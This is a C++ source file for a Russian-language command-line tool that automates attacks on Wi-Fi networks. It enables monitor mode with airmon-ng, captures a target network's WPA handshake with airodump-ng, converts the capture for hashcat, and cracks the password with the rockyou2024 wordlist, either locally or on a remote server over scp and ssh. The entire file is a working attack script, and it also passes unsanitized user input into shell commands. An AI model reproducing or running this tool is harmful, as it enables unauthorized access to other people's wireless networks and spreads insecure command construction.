// Wi-Fi Handshake Capture Tool
// Copyright (C) 2026 arlekin
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.


#include <iostream>
#include <cstdlib>
#include <chrono>
#include <cstdio>
#include <thread>
#include <string>
#include <csignal>
#define Red "\033[0;31m"
#define Green "\033[0;32m"
#define white "\033[0;37m"
#define blue "\033[0;34m"
const std::string RESET = "\033[0m";
const std::string YELLOW = "\033[33m";
const std::string MAGENTA = "\033[35m";
const std::string CYAN = "\033[36m";
const std::string BOLD = "\033[1m";
const std::string UNDERLINE = "\033[4m";

void signalHandler(int signum) {
    std::cout << "\n\n[!]Останавливаем мониторинг..." << std::endl;
    std::system("sudo airmon-ng stop wlan0mon");
    std::system("sudo systemctl restart NetworkManager");
    std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
    exit(0);
}

void printBar(int seconds) {
    auto start = std::chrono::steady_clock::now();
    
    for (int i = 0; i <= 100; i++) {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start
        ).count();
        
        if (elapsed >= seconds * 1000) break;
        
        int fill = (32 - 2) * i / 100;
        std::string bar = "[";
        bar += std::string(fill, '=');
        if (i < 100) bar += '>';
        bar += std::string(32 - 2 - fill - (i < 100 ? 1 : 0), ' ');
        bar += "]";
        
        std::cout << "\r" << bar << " " << i << "%" << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(seconds * 10));
    }
    std::cout << std::endl;
}
void Deistvie(int dei){
    int deistvie = dei;
    switch (deistvie) {
        case 1: {std::cout << "очистка мешающих процессов" << std::endl;
            int start = std::system("sudo airmon-ng check kill");
            
            if (start == 0) {
                std::cout << "включаем режим мониторинга" << std::endl;
                printBar(10);
                int start1 = std::system("sudo airmon-ng start wlan0");
                
                std::printf("следующие данные можно узнать при помощи команды sudo airodump-ng wlan0mon\n");
                std::printf("пожалуйста введите MAC адрес: ");
                std::string BSSID = "";
                std::cin >> BSSID;
                std::cout << std::endl;

                std::printf(" номер канала: ");
                int Number_chanel = 0;
                std::cin >> Number_chanel;
                std::cout << std::endl;

                std::printf(" И имя создоваемого файла, ЗАПОМНИ ЕГО: ");
                std::string name_for_file_cap = "";
                std::cin >> name_for_file_cap;
                std::cout << std::endl;

                std::printf("включаем режим тру хацкера и ждём пока кто нибудь подключится: \n");
                printBar(15);
                
                // ИСПРАВЛЕНО: Добавлены пробелы между аргументами
                std::string commands = "sudo airodump-ng -c " + std::to_string(Number_chanel) + " --bssid " + BSSID + " -w " + name_for_file_cap + " wlan0mon";
                int start3 = system(commands.c_str());
            }
                break;}
        case 2:{
            
            std::system("sudo airmon-ng stop wlan0mon");
            std::system("sudo systemctl restart NetworkManager");
            std::printf("пожалуйста введите имя файла: ");
            std::string name_for_file_cap = "";
            std::cin >> name_for_file_cap;
            std::cout << std::endl;
            std::string coma = "hcxpcapngtool -o output.22000 /home/arlekin/gamingtest/"+ name_for_file_cap +".cap";
            int hash = std::system(coma.c_str());
            if (hash == 0){
                printf("победа, файл, преобразован и ждёт отправки на сервер\n");
            }
            break;
        }
        
            case 3:{
    std::cout << "=============================================" << std::endl;
    std::cout << Red << "выберите действие:" << white << std::endl;
    std::cout << blue << "1 - расшифровать локально" << white << std::endl;
    std::cout << blue << "2 - отправить на сервер и расшифровать" << white << std::endl;
    std::cout << "=============================================" << std::endl;
    
    int local_or_server = 0;
    std::printf("пожалуйста введите номер действия: ");
    std::cin >> local_or_server;
    
    std::printf("пожалуйста введите имя файла (без расширения): ");
    std::string file_name = "";
    std::cin >> file_name;
    std::string full_filename = file_name + ".22000";
    
    if (local_or_server == 1) {
        std::cout << "=============================================" << std::endl;
        std::cout << Green << "локальная расшифровка" << white << std::endl;
        std::cout << "=============================================" << std::endl;
        
        std::printf("пожалуйста введите путь к словарю rockyou2024.zip: ");
        std::string dict_path = "";
        std::cin >> dict_path;
        
        std::string local_cmd = "unzip -p " + dict_path + " | hashcat -m 22000 -a 0 " + full_filename + " -O -w 3";
        std::system(local_cmd.c_str());
    }
    else if (local_or_server == 2) {
        std::cout << "=============================================" << std::endl;
        std::cout << Green << "отправка на сервер и расшифровка" << white << std::endl;
        std::cout << "=============================================" << std::endl;
        
        std::printf("пожалуйста введите абсолютный путь до файла .22000: ");
        std::string location_plus_file = "";
        std::cin >> location_plus_file;
        
        std::printf("пожалуйста введите ваше имя и айпи от ssh в формате имя@айпи: ");
        std::string name_plus_ip_ssh = "";
        std::cin >> name_plus_ip_ssh;
        
        std::printf("пожалуйста введите ваш port (если не меняли - 22): ");
        std::string port = "";
        std::cin >> port;
        
        std::printf("пожалуйста введите путь на сервере куда сохранить файл: ");
        std::string put_na_servac = "";
        std::cin >> put_na_servac;
        
        std::string scp_cmd = "scp " + location_plus_file + " " + name_plus_ip_ssh + ":" + put_na_servac + "/" + full_filename + "; ";
        std::string ssh_cmd = "ssh -p " + port + " " + name_plus_ip_ssh + " \"cd " + put_na_servac + " && unzip -p /path/to/rockyou2024.zip | hashcat -m 22000 -a 0 " + full_filename + " -O -w 3 -d 1\"";
        std::string full_cmd = scp_cmd + ssh_cmd;
        std::system(full_cmd.c_str());
    }
    else {
        std::printf("неверный выбор\n");
    }
    break;
}
            

        default:
        std::printf("кек");
}
}
int main() {
     std::signal(SIGINT, signalHandler);
    std::cout << Green << "=============================================" << white << std::endl; 
    std::cout << Red << "выбирите действие:" << white << std::endl;
    std::cout << blue << "1 перехватить пакет" << white << std::endl;
    std::cout << blue << "2 перевести в нужный формат для hashcat" << white << std::endl;
    std::cout << CYAN << "3 отправить на сервер и начать подбор"<< RESET << std::endl;
    std::cout << Green << "=============================================" << white << std::endl;
    int deistvie;
    while (true) {
    std::printf("пожалуйста введите номер действия");
    std::cin>>deistvie;
    Deistvie(deistvie);
    }
    return 0;
}
